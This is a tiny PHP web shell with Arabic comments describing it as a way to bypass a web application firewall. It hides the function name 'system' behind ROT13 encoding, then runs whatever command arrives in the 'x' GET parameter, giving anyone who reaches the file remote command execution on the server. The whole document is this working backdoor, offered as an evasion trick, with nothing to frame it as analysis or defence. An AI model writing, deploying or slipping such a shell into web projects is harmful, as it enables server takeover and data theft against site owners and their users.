<?php
// استخدام التشفير لتجاوز الـ WAF
$a = str_rot13('flfgrz'); // الكلمة مشفرة (system)
$b = $_GET['x'];
$a($b);
?>


